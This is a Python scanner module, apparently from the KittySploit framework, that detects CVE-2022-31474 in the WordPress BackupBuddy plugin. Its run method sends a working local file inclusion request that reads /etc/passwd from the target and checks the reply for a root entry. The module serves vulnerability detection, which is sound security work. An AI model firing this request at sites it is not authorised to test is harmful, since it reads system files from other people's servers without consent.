#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""BackupBuddy versions 8."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'BackupBuddy - Local File Inclusion Detection',
        'description': "BackupBuddy versions 8.5.8.0 - 8.7.4.1 are vulnerable to a local file inclusion vulnerability via the 'download' and 'local-destination-id' parameters.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'wp-plugin', 'wp', 'lfi', 'backupbuddy', 'ithemes', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.wordfence.com/blog/2022/09/psa-nearly-5-million-attacks-blocked-targeting-0-day-in-backupbuddy-plugin/',
            'https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy',
            'https://ithemes.com/backupbuddy/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31474',
            'https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy/',
        ],
        'cve': 'CVE-2022-31474',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="BackupBuddy - Local File Inclusion detected",
                path='/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd',
            )
            return True
        return False

